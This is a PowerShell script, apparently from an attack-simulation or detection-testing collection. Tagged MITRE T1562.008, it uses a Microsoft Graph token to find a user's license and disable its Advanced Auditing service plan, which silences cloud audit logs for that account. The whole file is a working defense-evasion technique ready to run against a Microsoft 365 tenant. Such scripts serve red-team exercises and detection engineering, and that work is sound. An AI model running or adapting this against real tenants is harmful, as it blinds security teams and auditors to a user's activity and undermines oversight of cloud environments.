<#
.SYNOPSIS
Connect to Graph API and remove advanced auditing license for a specific user
We do make the assumption that the license has been directly assigned to the user and not on a group level. 
The process for the group-level is similar but will use the https://learn.microsoft.com/en-us/graph/api/group-assignlicense?view=graph-rest-1.0&tabs=http endpoint

.DESCRIPTION
TA0005: Defense evasion
T1562.008: Impair Defenses - Disable or Modify Cloud Logs 
2nd attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1


# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "User.ReadWrite.All"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }

$account = Read-Host -Prompt "Account (disable advanced logs for)"

# Figure out the license a user has
$url = "https://graph.microsoft.com/v1.0/users/$account/licenseDetails"
$skus = Invoke-RestMethod $url -Headers @{"Authorization"="Bearer $accessToken"}
$skuToBeUsed = $null
foreach ($sku in $skus.value) {
    $hasAdvAudit = @($sku.servicePlans | Where-Object { $_.servicePlanName -like "M365_ADVANCED_AUDITING*" }).Count -gt 0
    if ($hasAdvAudit) { $skuToBeUsed = $sku.skuId}
}
if ($null -ne $skuToBeUsed) {
    $url = "https://graph.microsoft.com/v1.0/users/$account/assignLicense"
    $body = @{
        "addLicenses" = @(
            @{
                "skuId" = $skuToBeUsed;
                "disabledPlans" = @(,"2f442157-a11c-46b9-ae5b-6e39ff4e5849")
            };
        );
        "removeLicenses" = @();
    }
    $body = ConvertTo-Json $body -Depth 100 #Pipeline breaks empty array
    Write-Host $body
    Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $body
}
